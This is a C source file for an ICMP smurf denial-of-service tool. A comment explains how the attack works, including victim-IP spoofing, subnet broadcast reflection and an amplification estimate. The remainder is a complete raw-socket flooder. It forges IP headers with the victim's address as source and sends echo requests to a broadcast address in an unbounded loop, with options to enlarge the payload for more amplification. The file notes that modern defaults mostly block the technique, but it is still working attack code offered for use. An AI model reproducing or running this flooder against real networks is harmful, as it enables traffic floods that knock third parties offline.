// a ICMP broadcast smurf attack
// very difficult to actually apply
// uselessness: 7/10

/*
HOW IT WORKS

suppose:

attacker:
ip = 10.0.0.1

victim:
ip = 203.0.113.50

and a intermediate subnet with broadcast:
ip = 192.168.1.255

that is, a subnet where the victim
is located (or through which traffic must
pass to reach the victim) and where
the attacker is not present

the attacker sends a packet:
ip source = 203.0.113.50 (victim ip)
ip destionation = 192.168.1.255
icmp type = echo request

if the router allows the forwarding of
subnet-directed broadcasts, each host
on that subnet will receive an ICMP ECHO
packet and send a reply to the victim's
address

the gain in terms of the amplification
factor is approximately:

(Nº of hosts that respond) x (reply size / request size)

example: with 254 hosts and 64 bytes replies for
28 bytes requests ~= 580x. a 1Mbps link injects
580Mpbs into the victim.

PROBLEMS:

by default, since RFC 2644, the forwarding
of subnet-directed broadcasts is disabled
on routers. furthermore, hosts on the
subnet must be configured to accept ICMP packets
(net.ipv4.icmp_echo_ignore_broadcasts=0), as the
default settings is to ignore ICMP broadcasts.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

struct cfg {
	in_addr_t src;           // spoofed IP
	in_addr_t dst;           // broadcast IP
	int       payload;       // ICMP payload bytes
	long      count;         // 0 = infite
	int       interval_ms;   // 0 = no pause
	int       ttl;
	int       randomize;
};

static volatile sig_atomic_t stop;
static void on_sigint(int _) { (void) _; stop = 1; };

static unsigned short
csum(const void* data, size_t len)
{
	const unsigned short* p = data;
	unsigned int sum = 0;
	
	while (len > 1) {
		sum += *p++;
		len -= 2;
	}
	
	if (len) {
		sum += *(const unsigned char*) p;
	}
	
	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}
	
	return (unsigned short) ~sum;
}

static size_t
build_packet(
	unsigned char* buf,
	const struct cfg* c,
	unsigned short seq)
{
	struct iphdr*   ip   = (struct iphdr*) buf;
	struct icmphdr* icmp = (struct icmphdr*) (buf + sizeof(*ip));
	unsigned char*  pl   = buf + sizeof(*ip) + sizeof(*icmp);
	size_t icmp_len = sizeof(*icmp) + (size_t) c->payload;
	
	memset(buf, 0, sizeof(*ip) + icmp_len);
	
	for (int i = 0; i < c->payload; i++) {
		pl[i] = (c->randomize)
			? (unsigned char) (rand() & 0xff)
			: (unsigned char) ('A' + (i % 26));
	}
	
	// ICMP Echo Request
	icmp->type             = ICMP_ECHO;
	icmp->code             = 0;
	icmp->un.echo.id       = htons((unsigned short) (getpid() & 0xffff));
	icmp->un.echo.sequence = htons(seq);
	icmp->checksum         = 0;
	icmp->checksum         = csum(icmp, icmp_len);
	
	// IPv4 Header - manually created
	ip->version     = 4;
	ip->ihl         = 5;
	ip->tos         = 0;
	ip->tot_len     = htons((unsigned short) (sizeof(*ip) + icmp_len));
	ip->id          = htons((unsigned short) (rand() & 0xffff));
	ip->frag_off    = htons(0);    // use 0x4000 in order to use DF
	ip->ttl         = (unsigned char) c->ttl;
	ip->protocol    = IPPROTO_ICMP;
	ip->saddr       = c->src;
	ip->daddr       = c->dst;
	ip->check       = 0;
	ip->check       = csum(ip, sizeof(*ip));
	
	return sizeof(*ip) + icmp_len;
}

int
main(int argc, char** argv)
{
	struct cfg c = {0};
	int opt;
	
	if (argc < 3) {
		fprintf(
			stderr,
			"usage: %s <victim_ip> <broadcast> [-s payload] "
			"[-c n] [-i ms] [-t ttl] [-R]\n",
			argv[0]
		);
		
		return 1;
	}
	
	if (inet_pton(AF_INET, argv[1], &c.src) != 1 ||
	    inet_pton(AF_INET, argv[2], &c.dst) != 1)
	{
		perror("inet_pton");
		return 1;
	}
	
	c.payload = 56; c.ttl = 255; c.count = 0;
	
	// -s larger -> larger replies -> more amplification (<= 1472)
	while ((opt = getopt(argc - 2, argv + 2, "s:c:i:t:R")) != -1) {
		switch (opt) {
		case 's': c.payload     = atoi(optarg); break;
		case 'c': c.count       = atoi(optarg); break;
		case 'i': c.interval_ms = atoi(optarg); break;
		case 't': c.ttl         = atoi(optarg); break;
		case 'R': c.randomize   = 1;            break;
		default: return 1;
		}
	}
		
	if (c.payload < 0 || c.payload > 1400) {
		c.payload = 56;
	}
	
	if (c.ttl < 0 || c.ttl > 255) {
		c.ttl = 255;
	}
	
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if (fd < 0) {
		perror("socket(SOCK_RAW)");
		return 1;
	}
	
	int one = 1, zero = 0;
	
	if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("setsockopt(IP_HDRINCL)");
		return 1;
	}
	
	if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)) < 0) {
		perror("setsockopt(SO_BROADCAST)");
		return 1;
	}
	
	setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &(int) { 1 << 20 }, sizeof(int));
	
	(void) zero;
	
	struct sockaddr_in to = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = c.dst
	};
	
	unsigned char pkt[sizeof(struct iphdr) + sizeof(struct icmphdr) + 1500];
	
	srand((unsigned) time(NULL) ^ (unsigned) getpid());
	signal(SIGINT, on_sigint);
	
	char srcbuf[INET_ADDRSTRLEN], dstbuf[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &c.src, srcbuf, sizeof(srcbuf));
	inet_ntop(AF_INET, &c.dst, dstbuf, sizeof(dstbuf));
	
	printf(
		"[*] src(spoof)=%s dst(bcast)=%s payload=%d ttl=%d\n",
		srcbuf,
		dstbuf,
		c.payload,
		c.ttl
	);
	
	long sent = 0, failed = 0;
	size_t len = build_packet(pkt, &c, 0);
	struct timespec ts = { 
		c.interval_ms / 1000,
		(long) (c.interval_ms % 1000) * 1000000L
	};
	
	while (!stop && (c.count == 0 || sent < c.count)) {
		len = build_packet(pkt, &c, (unsigned short) (sent & 0xffff));
		
		if (sendto(fd, pkt, len, 0, (struct sockaddr*) &to, sizeof(to)) < 0) {
			if (errno != EINTR) {
				failed++;
			}
		}
		
		else {
			sent++;
		}
		
		if (c.interval_ms > 0) {
			nanosleep(&ts, NULL);
		}
	}
	
	printf(
		"[+] sent=%ld (%zu bytes/packet) failed=%ld\n",
		sent,
		len,
		failed
	);
	
	close(fd);
	return 0;
}